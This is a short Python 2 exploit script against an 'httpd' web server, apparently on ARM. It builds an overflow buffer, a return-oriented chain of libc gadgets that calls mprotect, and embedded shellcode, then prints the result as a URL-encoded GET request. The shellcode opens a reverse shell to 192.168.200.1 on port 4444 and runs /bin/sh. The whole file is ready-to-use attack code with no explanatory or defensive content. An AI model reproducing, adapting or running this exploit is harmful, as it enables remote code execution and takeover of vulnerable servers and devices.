#!/usr/bin/python

#Exploitation of httpd
from struct import pack
from urllib import quote

# function to create a libc gadget
# requires a global variable called libc_base;
def libc(libc_base, offset):
   return(pack("<I", libc_base + offset))

# function to represent data on the stack
def data(value):
   return(pack("<I", value));

libc_base = 0xb6e9c000  # libc base address
initial_lr = 0x3c420
pop_pc_gadget = 0x8cec5
set_r1 = 0x1019d4
set_r0_7 = 0x000d68ec
mov_r2_r0 = 0x0002cc78
pop_r0_mask = 0x00078fac
bwand_r0_r3 = 0x00064934
mprotect = 0xc70f0
bx_sp = 0x5530 + 1

shellcode = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x03\x1c\x09\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x03\x21\x18\x1c\x01\x39\x01\xdf\xfb\xd1\x05\xa0\x52\x40\x05\xb4\xc2\x71\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\xff\x11\x5c\xc0\xa8\xc8\x01\x2f\x62\x69\x6e\x2f\x73\x68\x5a"


buf = "A" * 343

buf += libc(libc_base, initial_lr) # pop {lr}; add sp, sp, #4; bx lr;
buf += "A"* 16         # padding
buf += libc(libc_base, pop_pc_gadget) #pop {pc};
buf += data(0x45454545) #JUNK
buf += libc(libc_base, set_r1) #pop {r1, pc};
buf += data(0x01010101) #set R1
buf += libc(libc_base, set_r0_7) #mov r0, #7; pop {r4, r5, r6, pc}; 
buf += data(0x46464646) #JUNK R4
buf += data(0x46464646) #JUNK R5
buf += data(0x46464646) #JUNK R6
buf += libc(libc_base, mov_r2_r0) #mov r2, r0; mov r0, r2; pop {r4, r7, pc}; 
buf += data(0x46464646) #JUNK R4
buf += data(0x46464646) #JUNK R7
buf += libc(libc_base, pop_r0_mask) #pop {r0, r4, pc};
buf += data(0xfffff001) # mask
buf += data(0x46464646) #JUNK R7
buf += libc(libc_base, bwand_r0_r3) #and r0, r3, r0; bx lr;
buf += libc(libc_base, mprotect) #mprotect call
buf += libc(libc_base, bx_sp) #bx sp
buf += shellcode

uri = buf
uri = quote(uri)

request = "GET /" + uri + " HTTP/1.0\n\n"
print request
